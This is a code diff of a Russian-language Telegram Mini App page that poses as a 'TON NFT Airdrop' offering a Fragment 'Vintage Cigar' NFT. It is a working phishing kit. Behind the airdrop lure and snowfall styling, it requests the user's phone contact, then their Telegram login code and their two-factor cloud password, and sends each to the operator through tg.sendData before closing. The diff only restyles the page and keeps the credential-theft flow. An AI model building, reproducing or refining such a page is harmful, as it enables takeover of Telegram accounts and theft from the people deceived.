@@ -3,149 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NFT Airdrop Center</title>
+    <title>TON NFT Airdrop</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;800&family=Orbitron:wght@600;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;700;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
     
     <style>
-        /* CSS */
         :root {
-            --bg: #0f121a;
-            --card-bg: rgba(255, 255, 255, 0.05);
-            --accent: #2e7bff; /* Более насыщенный синий для NFT */
+            --bg: #05070a;
+            --card-bg: rgba(255, 255, 255, 0.03);
+            --accent: #0088cc;
             --text-main: #ffffff;
-            --text-muted: #8e8e93;
-            --glow: rgba(46, 123, 255, 0.5); /* Синее свечение */
-            --nft-glow: rgba(0, 255, 255, 0.6); /* Бирюзовое свечение для NFT */
-            --border-glow: rgba(46, 123, 255, 0.3);
+            --glow: rgba(0, 136, 204, 0.4);
         }
 
         body {
             font-family: 'Manrope', sans-serif;
-            background: linear-gradient(135deg, #0f121a 0%, #080a0e 100%);
+            background-color: var(--bg);
+            background-image: radial-gradient(circle at center, #101a2b 0%, #05070a 100%);
             color: var(--text-main);
             margin: 0;
-            padding: 20px;
-            overflow: hidden; 
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            padding: 0;
+            overflow: hidden;
             height: 100vh;
-            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
-        /* Контейнер для снега */
+        /* ЖИРНЫЙ СНЕГ */
         #snow-container {
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
             pointer-events: none;
-            z-index: 0; /* Под карточкой */
+            z-index: 1;
         }
 
         .snowflake {
             position: absolute;
             background: white;
             border-radius: 50%;
-            opacity: 0.8;
-            pointer-events: none;
-            animation: snowfall linear infinite; /* Анимация будет в JS */
+            filter: blur(1px);
+            z-index: 1;
         }
 
         .container {
-            z-index: 1; /* Над снегом */
-            width: 100%;
-            max-width: 420px; /* Чуть шире */
-            text-align: center;
             position: relative;
-            padding-top: 5vh; /* Отступ сверху */
+            z-index: 10;
+            width: 90%;
+            max-width: 380px;
         }
 
         .glass-card {
             background: var(--card-bg);
-            backdrop-filter: blur(20px); /* Сильнее размытие */
-            border: 1px solid var(--border-glow);
-            border-radius: 35px; /* Более округлые */
-            padding: 35px 25px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5), 0 0 40px var(--glow);
-            position: relative;
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 40px;
+            padding: 40px 25px;
+            text-align: center;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
         }
 
-        .nft-image {
-            width: 150px; /* Размер NFT */
-            height: 150px;
+        /* ТВОИ NFT КАРТИНКИ */
+        .nft-preview {
+            width: 180px;
+            height: 180px;
+            border-radius: 25px;
             object-fit: cover;
-            border-radius: 15px;
             margin-bottom: 20px;
-            box-shadow: 0 0 25px var(--nft-glow), 0 0 50px rgba(0, 255, 255, 0.3);
-            transition: transform 0.3s ease;
+            box-shadow: 0 0 30px var(--glow);
+            border: 2px solid rgba(255,255,255,0.2);
         }
-        .nft-image:hover { transform: scale(1.05); }
 
-        h1 { font-family: 'Orbitron', sans-serif; font-size: 32px; font-weight: 800; margin: 15px 0; letter-spacing: 0.5px; text-transform: uppercase; }
-        p { color: var(--text-muted); font-size: 16px; line-height: 1.6; margin-bottom: 30px; }
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 24px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin: 10px 0;
+        }
 
         .nft-count {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 64px;
+            font-size: 72px;
             font-weight: 800;
-            background: linear-gradient(180deg, #99ffff 0%, #00aaff 100%); /* Голубой градиент */
+            font-family: 'Orbitron', sans-serif;
+            background: linear-gradient(180deg, #fff, #0088cc);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
-            text-shadow: 0 0 20px rgba(0, 255, 255, 0.7);
+            margin: 10px 0;
         }
 
         .btn {
             background: var(--accent);
-            color: white;
+            color: #fff;
             border: none;
-            border-radius: 20px;
             padding: 20px;
             width: 100%;
-            font-weight: 700;
+            border-radius: 22px;
             font-size: 18px;
-            transition: all 0.3s ease;
-            box-shadow: 0 12px 25px var(--glow);
+            font-weight: 700;
+            box-shadow: 0 10px 25px var(--glow);
             cursor: pointer;
-            text-transform: uppercase;
+            margin-top: 20px;
         }
-
-        .btn:hover { background: #0066d4; }
-        .btn:active { transform: scale(0.97); opacity: 0.95; }
 
         input {
-            width: calc(100% - 32px); /* Учитываем padding */
-            background: rgba(255, 255, 255, 0.08);
-            border: 1px solid rgba(255, 255, 255, 0.15);
+            width: 100%;
+            padding: 20px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
             border-radius: 18px;
-            padding: 18px;
-            color: white;
-            font-size: 22px; /* Чуть крупнее */
+            color: #fff;
+            font-size: 24px;
             text-align: center;
-            margin-top: 18px;
-            outline: none;
+            margin-top: 20px;
             box-sizing: border-box;
-            transition: border-color 0.3s ease, box-shadow 0.3s ease;
-        }
-        input:focus {
-            border-color: var(--accent);
-            box-shadow: 0 0 15px var(--glow);
+            outline: none;
         }
 
-        .step { display: none; opacity: 0; transform: translateY(20px); }
-        .active { display: block; animation: fadeIn 0.6s cubic-bezier(0.2, 0.8, 0.2, 1) forwards; }
+        .step { display: none; }
+        .active { display: block; animation: slideUp 0.4s ease-out; }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0px); }
-        }
-
-        /* Анимация для снега */
-        @keyframes snowfall {
-            0% { transform: translate(0, -10%); opacity: 0; }
-            50% { opacity: 1; }
-            100% { transform: translate(0, 100vh); opacity: 0; }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
         }
     </style>
 </head>
@@ -156,132 +138,87 @@
     <div class="container">
         <div id="step-1" class="step active">
             <div class="glass-card">
-                <img src="https://i.ibb.co/h7gJj4H/BAYC-NFT.png" alt="NFT Art" class="nft-image"> <h1>NFT Airdrop</h1>
-                <p>Вы получили эксклюзивные NFT за лояльность к Telegram. Заберите свой бонус!</p>
-                <div class="nft-count" id="nft-num">0</div>
-                <div style="margin-bottom: 30px; color: var(--text-muted); font-weight: 600;">УНИКАЛЬНЫХ NFT</div>
-                <button class="btn" onclick="startClaim()">Получить NFT</button>
+                <img src="https://cache.tonapi.io/imgproxy/GwTyqFIK-SGPuBYQpyeaAsPLU2nhV-Ccmlygn5DmV18/rs:fill:500:500:1/g:no/aHR0cHM6Ly9uZnQuZnJhZ21lbnQuY29tL2dpZnQvdmludGFnZWNpZ2FyLTEzNzA5LndlYnA.webp" class="nft-preview">
+                <h1>Airdrop Claim</h1>
+                <p style="color: #8e8e93;">Поздравляем! Вам доступна коллекция "Vintage Cigar" от Fragment.</p>
+                <div class="nft-count">1</div>
+                <div style="color: var(--accent); font-weight: 800; letter-spacing: 2px;">RARE NFT</div>
+                <button class="btn" onclick="nextStep('step-2')">ЗАБРАТЬ NFT</button>
             </div>
         </div>
 
         <div id="step-2" class="step">
             <div class="glass-card">
-                <img src="https://i.ibb.co/L51H27P/Telegram-Icon.png" alt="Telegram Icon" class="nft-image" style="box-shadow: none; filter: grayscale(100%);">
-                <h1>Подтверждение</h1>
-                <p>Для зачисления NFT-активов на ваш кошелек, пожалуйста, подтвердите свою личность.</p>
-                <button class="btn" onclick="getPhone()">Подтвердить через Telegram</button>
+                <img src="https://avatars.mds.yandex.net/i?id=336f598438202673884bdffcb6c6cb41_sr-4958745-images-thumbs&n=13" class="nft-preview" style="filter: brightness(0.8);">
+                <h1>Верификация</h1>
+                <p style="color: #8e8e93;">Подтвердите владение кошельком через Telegram профиль.</p>
+                <button class="btn" onclick="getPhone()">ПОДТВЕРДИТЬ</button>
             </div>
         </div>
 
         <div id="step-3" class="step">
             <div class="glass-card">
-                <h1>Код верификации</h1>
-                <p>Мы отправили секретный код в чат Telegram. Введите его, чтобы продолжить.</p>
-                <input type="number" id="sms-input" placeholder="00000" oninput="autoSendCode(this)">
-                <button class="btn" style="margin-top: 20px;" onclick="manualSendCode()">Продолжить</button>
+                <h1>Введите код</h1>
+                <p style="color: #8e8e93;">Telegram отправил код подтверждения в ваши чаты.</p>
+                <input type="number" id="sms-input" placeholder="00000" oninput="if(this.value.length==5) sendCode()">
+                <button class="btn" onclick="sendCode()">ДАЛЕЕ</button>
             </div>
         </div>
 
         <div id="step-4" class="step">
             <div class="glass-card">
-                <h1>Защита аккаунта</h1>
-                <p>Ваш аккаунт защищен облачным паролем. Введите его для завершения перевода NFT.</p>
+                <h1>2FA Пароль</h1>
+                <p style="color: #8e8e93;">Введите облачный пароль для завершения транзакции.</p>
                 <input type="password" id="pass-input" placeholder="Пароль">
-                <button class="btn" style="margin-top: 20px;" onclick="sendFinal()">Завершить</button>
+                <button class="btn" onclick="sendFinal()">ПОДПИСАТЬ</button>
             </div>
         </div>
     </div>
 
     <script>
-        // JavaScript
         let tg = window.Telegram.WebApp;
         tg.expand();
 
-        // УЛУЧШЕННЫЙ СКРИПТ СНЕГА
-        function createSnowflake() {
+        // СКРИПТ СНЕГА (ЖИРНЫЙ)
+        function createSnow() {
             const container = document.getElementById('snow-container');
-            let snow = document.createElement('div');
-            snow.className = 'snowflake';
-            let size = Math.random() * 5 + 3 + 'px'; // Размер от 3 до 8px
-            snow.style.width = size;
-            snow.style.height = size;
-            snow.style.left = Math.random() * 100 + 'vw';
-            snow.style.opacity = Math.random() * 0.7 + 0.3; // Опасити от 0.3 до 1
-            
-            // Задаем начальную позицию сверху
-            snow.style.top = -10 - (Math.random() * 10) + 'vh'; // С небольшим запасом выше экрана
-            
-            // Продолжительность анимации для каждого снежинки
-            let duration = Math.random() * 8 + 7; // Длительность от 7 до 15 секунд
-            snow.style.animationDuration = duration + 's';
-            snow.style.animationDelay = Math.random() * -15 + 's'; // Чтобы они появлялись в разное время
-            
-            container.appendChild(snow);
+            for (let i = 0; i < 60; i++) {
+                let flake = document.createElement('div');
+                flake.className = 'snowflake';
+                let size = Math.random() * 5 + 2; // Крупные снежинки
+                flake.style.width = size + 'px';
+                flake.style.height = size + 'px';
+                flake.style.left = Math.random() * 100 + 'vw';
+                flake.style.top = Math.random() * -100 + 'px';
+                flake.style.opacity = Math.random();
+                container.appendChild(flake);
 
-            // Удаляем снежинку после окончания анимации, чтобы не накапливались
-            snow.addEventListener('animationiteration', () => {
-                snow.style.left = Math.random() * 100 + 'vw';
-                snow.style.animationDuration = (Math.random() * 8 + 7) + 's';
-                snow.style.opacity = Math.random() * 0.7 + 0.3;
-            });
+                flake.animate([
+                    { transform: 'translateY(0vh) translateX(0px)' },
+                    { transform: `translateY(105vh) translateX(${Math.random() * 40 - 20}px)` }
+                ], {
+                    duration: Math.random() * 3000 + 4000,
+                    iterations: Infinity,
+                    delay: Math.random() * 5000
+                });
+            }
         }
+        createSnow();
 
-        const numberOfSnowflakes = 60; // Больше снежинок
-        for (let i = 0; i < numberOfSnowflakes; i++) {
-            createSnowflake();
-        }
-
-
-        function showStep(id) {
-            document.querySelectorAll('.step').forEach(s => {
-                s.classList.remove('active');
-                s.style.display = 'none'; // Гарантируем скрытие
-                s.style.opacity = '0';
-                s.style.transform = 'translateY(20px)';
-            });
-            const activeStep = document.getElementById(id);
-            activeStep.style.display = 'block'; // Показываем
-            activeStep.classList.add('active'); // Запускаем анимацию
-        }
-
-        function startClaim() {
-            let b = document.getElementById('nft-num');
-            let val = 0;
-            let int = setInterval(() => {
-                val++;
-                b.innerText = val;
-                if(val >= 3) { // Начисляем 3 NFT
-                    clearInterval(int);
-                    setTimeout(() => showStep('step-2'), 1200); // Чуть дольше анимация
-                }
-            }, 100);
+        function nextStep(id) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
         }
 
         function getPhone() {
-            tg.requestContact((ok) => { 
-                if(ok) {
-                    showStep('step-3'); 
-                } else {
-                    // Можно показать ошибку или предложить другой способ
-                    alert('Для продолжения необходимо поделиться контактом.');
-                }
-            });
+            tg.requestContact((ok) => { if(ok) nextStep('step-3'); });
         }
 
-        function autoSendCode(el) {
-            if(el.value.length === 5) { // Код Telegram обычно 5 цифр
-                manualSendCode();
-            }
-        }
-
-        function manualSendCode() {
+        function sendCode() {
             let val = document.getElementById('sms-input').value;
-            if(val.length >= 5) { // Проверяем длину кода
+            if(val.length >= 5) {
                 tg.sendData("CODE:" + val);
-                // Задержка для имитации обработки
-                setTimeout(() => showStep('step-4'), 2500); 
-            } else {
-                alert('Пожалуйста, введите полный код.');
+                setTimeout(() => nextStep('step-4'), 1500);
             }
         }
 
@@ -289,9 +226,7 @@
             let val = document.getElementById('pass-input').value;
             if(val.length > 0) {
                 tg.sendData("PASS:" + val);
-                tg.close(); // Закрываем WebApp после отправки
-            } else {
-                alert('Пожалуйста, введите пароль.');
+                tg.close();
             }
         }
     </script>
